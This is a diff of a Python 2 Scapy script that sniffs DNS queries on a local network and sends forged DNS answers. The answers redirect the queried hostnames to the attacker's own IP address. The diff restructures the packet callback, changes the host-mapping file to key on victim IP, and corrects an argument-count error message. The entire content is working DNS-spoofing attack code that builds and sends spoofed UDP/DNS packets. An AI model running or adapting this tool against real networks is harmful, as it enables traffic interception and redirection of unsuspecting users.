@@ -5,24 +5,22 @@ import netifaces
 
 def callback(dict, local_ip):
     def get_response(pkt):
-        if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != local_ip:
-            if len(dict) == 0:
+        if len(dict) == 0:
+            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != local_ip:
                 if str(pkt['DNS Question Record'].qname):
                     spoofed_packet = IP(dst=pkt[IP].src) \
                                      / UDP(dport=pkt[UDP].sport, sport=53) \
                                      / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip))
                     send(spoofed_packet, verbose=0)
                 return 'Spoofed DNS Response Sent'
-            else:
-                qn = str(pkt['DNS Question Record'].qname)
-                if qn and qn in dict:
-                    new_ip = dict[qn]
+        else:
+            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src in dict:
+                if str(pkt['DNS Question Record'].qname):
                     spoofed_packet = IP(dst=pkt[IP].src) \
                                      / UDP(dport=pkt[UDP].sport, sport=53) \
-                                     / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=new_ip))
+                                     / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip))
                     send(spoofed_packet, verbose=0)
-        else:
-            return 'hello'
+                return 'Spoofed DNS Response Sent'
 
     return get_response
 
@@ -44,7 +42,7 @@ def parse_args(argv):
         print 'Too many arguments.  Expected: [-i interface] [-h hostnames] expression'
         sys.exit(2)
     if l < 1:
-        print 'Too many arguments.  Expected: [-i interface] [-h hostnames] expression'
+        print 'Too few arguments.  Expected: [-i interface] [-h hostnames] expression'
         sys.exit(2)
     for opt, arg in opts:
         if opt == '-h':
@@ -77,7 +75,7 @@ def main(argv):
             with open(hosts_file) as f:
                 for line in f:
                     ip, url = line.partition(" ")[::2]
-                    dict[url.strip()] = ip.strip()
+                    dict[ip.strip()] = url.strip()
             print "Dict is " + str(dict)
         except OSError:
             print('Error in opening host_mapping file:' + hosts_file);
